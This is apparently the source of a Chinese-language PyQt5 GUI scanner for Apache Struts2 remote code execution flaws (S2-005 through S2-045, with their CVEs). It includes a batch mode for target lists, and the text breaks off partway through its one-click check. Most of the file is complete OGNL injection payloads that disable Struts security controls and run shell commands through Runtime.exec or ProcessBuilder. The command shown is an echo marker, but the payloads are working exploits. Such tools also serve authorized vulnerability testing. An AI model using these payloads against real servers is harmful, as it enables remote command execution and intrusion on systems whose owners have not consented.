#    url = "http://192.168.43.131:23456/S2-005/example/HelloWorld.action"
#    url = "http://192.168.43.131:23456/S2-008/devmode.action"
#    url = "http://192.168.43.131:23456/S2-009/ajax/example5.action"
#    url = 'http://192.168.43.131:23456/S2-016/default.action'
#    url = "http://192.168.43.131:23456/S2-019/example/HelloWorld.action"
#    url = "http://192.168.43.131:23456/S2-032/memoshow.action"
#    url = "http://192.168.43.131:23456/S2-045/orders"
import requests
import re
import sys
import ui_Struts2mainGUI
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog, QProgressBar, QMessageBox
from PyQt5 import QtWidgets
from PyQt5 import QtCore
from PyQt5.QtCore import QBasicTimer, Qt
import datetime
import time
import win32ui
import batch
from urllib import parse


# -----------------------------------------------------------------------
    # 创建一个显示类       [+] textbrowser创建

class WrittingStr(QtCore.QObject):
    textBrowserWritten = QtCore.pyqtSignal(str) #定义一个发送str的信号
    def write(self, words):
      self.textBrowserWritten.emit(str(words))

class WrittingStr_2(QtCore.QObject):
    textBrowserWritten_2 = QtCore.pyqtSignal(str) #定义一个发送str的信号
    def write(self, words):
      self.textBrowserWritten_2.emit(str(words))

class WrittingStr_3(QtCore.QObject):
    textBrowserWritten_3 = QtCore.pyqtSignal(str) #定义一个发送str的信号
    def write(self, words):
      self.textBrowserWritten_3.emit(str(words))

# -----------------------------------------------------------------------

class mainGUI(ui_Struts2mainGUI.Ui_MainWindow, QMainWindow):
    def __init__(self):
        super(mainGUI, self).__init__()
        self.setupUi(self)
        # 设置信号与槽函数


        # 左侧检测按钮（pushButton）切换检测页面（show_jiance），pushButton -> show_jiance
        self.pushButton.clicked.connect(self.show_jiance)
        # 左侧检测按钮（pushButton_2）切换执行页面（show_zhixing），pushButton -> show_zhixing
        self.pushButton_2.clicked.connect(self.show_zhixing)
        # 左侧检测按钮（pushButton_6）切换批量页面（show_piliang），pushButton -> show_piliang
        self.pushButton_6.clicked.connect(self.show_piliang)


        # 检测页面
        # 功能：控件绑定槽函数
        self.lineEdit.textChanged.connect(self.jc_convert)
        self.lineEdit_2.textChanged.connect(self.jc_cookie)
        self.lineEdit_4.textChanged.connect(self.jc_timeout)
        self.comboBox.activated[str].connect(self.jc_option)
        self.pushButton_5.clicked.connect(self.jc_clear)
        self.pushButton_14.clicked.connect(self.jc_openfile)
        self.pushButton_7.clicked.connect(self.jc_outfile)




        # 利用页面
        # 功能：控件绑定槽函数
        self.pushButton_13.clicked.connect(self.ly_clear)
        self.lineEdit_5.textChanged.connect(self.ly_exp)
        self.lineEdit_6.textChanged.connect(self.ly_cmd)
        self.pushButton_10.clicked.connect(self.ly_outfile)
        self.comboBox_2.activated[str].connect(self.ly_option)


        # 批量页面
        # 功能：控件绑定槽函数
        self.pushButton_3.clicked.connect(self.pl_openfile)
        self.pushButton_9.clicked.connect(self.pl_batch)
        self.lineEdit_7.textChanged.connect(self.pl_path)
        self.lineEdit_9.textChanged.connect(self.pl_timeout)
        self.pushButton_12.clicked.connect(self.pl_clear)
        self.pushButton_11.clicked.connect(self.pl_outfile)


#************************************************
#检测页面跳转

    # 槽函数：索引setCurrentIndex()的页面数，作为跳转页面
    def show_jiance(self):
        self.stackedWidget.setCurrentIndex(0)
        sys.stdout = WrittingStr(textBrowserWritten=self.js_outputWritten)
        sys.stderr = WrittingStr(textBrowserWritten=self.js_outputWritten)
        self.timer = QBasicTimer()
        self.step = 0


#------------------------------------------------
#检测页面设置


    def jc_convert(self):
        global url
        global check_url
        self.url = self.lineEdit.text()
        self.check_url = 1

    def jc_cookie(self):
        global cookie
        global check_cookie
        self.cookie = self.lineEdit_2.text()
        self.check_cookie = 1

    def jc_timeout(self):   
        global timeout
        global check_timeout
        self.timeout = self.lineEdit_4.text()
        self.check_timeout = 1

    def jc_openfile(self):
        try:
            filewindow = win32ui.CreateFileDialog(1)  # 1表示打开文件对话框
            filewindow.DoModal()
            file = filewindow.GetPathName()  # 获取选择的文件名称
            self.step = 0
            self.batch(file)
            #QMessageBox.information(self, "导入信息", "导入完成", QMessageBox.Yes)
        except Exception as out:
            #QMessageBox.warning(self, "导入信息", "导入失败,请检测 Timeout 值", QMessageBox.No)
            pass




    def batch(self,file):
        timeout = self.timeout
        timeout = int(timeout)
        with open(file, 'r') as f:
            Struts2_targets = f.readlines()
        for target in Struts2_targets:
            try:
                target = target.split('\n')[0]
            except:
                pass
            start = time.perf_counter()
            print('[+]Testing: ' + target)
            batch.poc(target,timeout)
            end = time.perf_counter()
            if self.timer.isActive():
                self.timer.stop()
            else:
                self.timer.start(int(end - start), self)



    def timerEvent(self, e):

        if self.step >= 100:
            self.timer.stop()
            return
        self.step = self.step + 1
        self.progressBar.setValue(self.step)



    def jc_option(self,parameter):
        self.pushButton_4.setCheckable(True)  # 一开始
        self.pushButton_4.toggle()  # toggle()切换按钮状态
        # ComboBox的选项，对应使用哪种poc函数
        if parameter == "一键检测":
         # 先断开pushButton的连接，初始化pushButton,再通过parameter匹配对应poc
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.poc)
        elif parameter == "S2-005":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_005)
        elif parameter == "S2-008":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_008)
        elif parameter == "S2-009":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_009)
        elif parameter == "S2-016":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_016)
        elif parameter == "S2-019":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_019)
        elif parameter == "S2-032":
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_032)
        else:
            self.pushButton_4.disconnect()
            self.pushButton_4.clicked.connect(self.s2_045)


    #重定向输出流 - 展示在文本区域内
    def js_outputWritten(self, text):
        cursor = self.textBrowser.textCursor()      #文本光标位置的获取
        cursor.insertText(text)                     #在光标位置插入
        self.textBrowser.setTextCursor(cursor)      #文本显示位置
        self.textBrowser.ensureCursorVisible()      #显示最后一条数据
        QtWidgets.QApplication.processEvents()      #逐条输出，实时刷新界面


    def jc_clear(self):
        self.textBrowser.clear()

    def jc_outfile(self):
        try:
            Outprinttext = self.textBrowser.toPlainText()
            outprint = str(Outprinttext)
            filewindow = win32ui.CreateFileDialog(1)  # 1表示打开文件对话框
            filewindow.DoModal()             # 用函数---显示模态对话框
            file = filewindow.GetPathName()  # 获取选择的文件名称
            file = open(file,'a')
            file.write('{}'.format(outprint))
            print("\n[+] 导入成功，保存在项目根目录的text文件")
            file.close()
            QMessageBox.information(self, "导出信息", "导出成功", QMessageBox.Yes)
        except Exception as out:
            QMessageBox.warning(self, "导出信息", "导出失败", QMessageBox.No)




    def s2_005(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)


        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
            'Cookie': cookie
        }


        poc = "('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url, headers=headers, data=poc, timeout=timeout)
                if 'S2-005' in response.text and response.status_code == 200:  # 返回包如果出现S2-005和200响应码即表示存在漏洞
                    print("[+] 存在S2-005漏洞")
                    print("[+] S2-005————[CVE-2010-1870]————可执行shell|CMD|dir", '\n')
                    #print(check) 为3
                else:
                    print("[-] 目标不存在S2-005漏洞...", '\n')
            except Exception as out:
                print("检测S2-005超时..")
                print(out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_008(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
            'Cookie': cookie
        }


        poc = "debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20S2-008%27%29.getInputStream%28%29%29)"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url + '?' + poc, headers=headers, timeout=timeout)
                if 'S2-008' in response.text and response.status_code == 200:  # 返回包如果出现S2-008和200响应码即表示存在漏洞
                    print("[+] 存在S2-008漏洞")
                    print("[+] S2-008————[CVE-2012-0392]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-008漏洞...", '\n')
            except Exception as out:
                print("检测S2-008超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_009(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }


        poc = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20S2-009%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url + '?' + poc, headers=headers, timeout=timeout)
                if 'S2-009' in response.text and response.status_code == 200:  # 返回包如果出现S2-009和200响应码即表示存在漏洞
                    print("[+] 存在S2-009漏洞")
                    print("[+] S2-009————[CVE-2011-3923]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-009漏洞...", '\n')
            except Exception as out:
                print("检测S2-009超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_016(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }


        poc = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20S2-016%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url + '?' + poc, headers=headers, timeout=timeout)
                if 'S2-016' in response.text and response.status_code == 200:  # 返回包如果出现S2-016和200响应码即表示存在漏洞
                    print("[+] 存在S2-016漏洞")
                    print("[+] S2-016————[CVE-2013-2251]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-016漏洞...", '\n')
            except Exception as out:
                print("检测S2-016超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_019(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        timeout = 3
        poc = "debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20S2-019%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url + '?' + poc, headers=headers, timeout=timeout)
                if 'S2-019' in response.text and response.status_code == 200:  # 返回包如果出现S2-019和200响应码即表示存在漏洞
                    print("[+] 存在S2-019漏洞")
                    print("[+] S2-019————[CVE-2013-4316]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-019漏洞...", '\n')
            except Exception as out:
                print("检测S2-019超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_032(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        }

        poc = "method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=echo%20S2-032&dd=%20&d=____A&encoding=UTF-8"
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url + '?' + poc, headers=headers, timeout=timeout)
                if 'S2-032' in response.text and response.status_code == 200:  # 返回包如果出现S2-032和200响应码即表示存在漏洞
                    print("[+] 存在S2-032漏洞")
                    print("[+] S2-032————[CVE-2016-3081]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-032漏洞...", '\n')
            except Exception as out:
                print("检测S2-032超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)


    def s2_045(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)

        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
            }

        s2_045poc = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo S2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url, headers=s2_045poc, timeout=timeout)
                if 'S2-045' in response.text and response.status_code == 200:  # 返回包如果出现S2-045和200响应码即表示存在漏洞
                    print("[+] 存在S2-045漏洞")
                    print("[+] S2-045————[CVE-2017-5638]————可执行shell|CMD|dir", '\n')
                else:
                    print("[-] 目标不存在S2-045漏洞...", '\n')
            except Exception as out:
                print("检测S2-045超时..")
                print("超时原因: ", out)
            return
        else:
            QMessageBox.warning(self, "检测信息", "请输入正确的URL", QMessageBox.No)



    def poc(self):
        url = self.url
        cookie = self.cookie
        timeout = self.timeout
        timeout = int(timeout)
        s5 = 0
        s8 = 0
        s9 = 0
        s16 = 0
        s19 = 0
        s32 = 0
        s45 = 0
        res = s5+s8+s9+s16+s19+s32+s45

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
            'Cookie': cookie
        }

        s2_045poc = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo S2-045').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        }


        poc = {
            "s2-005":'''('%5C43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%5C43context[%5C'xwork.MethodAccessor.denyMethodExecution%5C']%5C75false')(b))&('%5C43c')(('%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET')(c))&(g)(('%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%5C43xman.getWriter().print(%22S2-005%22)')(d))&(i95)(('%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))')(d))&(i99)(('%5C43xman.getWriter().close()')(d))''',
            "s2-008":'''debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20S2-008%27%29.getInputStream%28%29%29)''',
            "s2-009":'''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo%20S2-009%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]''',
            "s2-016":'''redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22echo%20S2-016%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D''',
            "s2-019":'''debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20S2-019%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()''',
            "s2-032":'''method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=echo%20S2-032&dd=%20&d=____A&encoding=UTF-8'''
        }

        print('\n')
        print("[*]Testing ---------------------------->: " + url)
        time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')  # %Y表示四位数的年份表示(000-9999) %m月份(0-12) %d天数(0-31) %H小时(24) %M分钟(0-60) %S秒(0-60)
        print("[+]Time: "+ time + "----------->: 开始检测")
        print('\n')
        if re.match(r'((http|https):\/\/(((25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}\.){3})(25[0-5]|2[0-4][0-9]|[01]?[0-9]{0,2}))'    #正则匹配ip地址：从255划分        25[0-5] 2[0-4]\d [01]?\d\d   
                     ':(6553[0-5]|655[0-2][0-9]|65[0-4][0-9]{2}|6[0-4][0-9]{3}|[1-5][0-9]{4}|[1-9][0-9]{0,3})'                  #端口号：       从65535划分      6553[0-5] 655[0-2][0-9] ...
                     '+[A-Za-z0-9-_%&\?\/.=]+$)'                                                                                #具体路径：      将a-z、A-Z、0-9 [特殊字符：-_%&\?\/.=]，组成具体路径
                     '|((http|https):\/\/[\w._\/&@-]+$)', url                                                                   #域名访问：      \w表示所有英文、数字、下划线的集合
                    ):
            try:
                response = requests.get(url=url, headers=headers, data=poc['s2-005'], timeout=timeout)
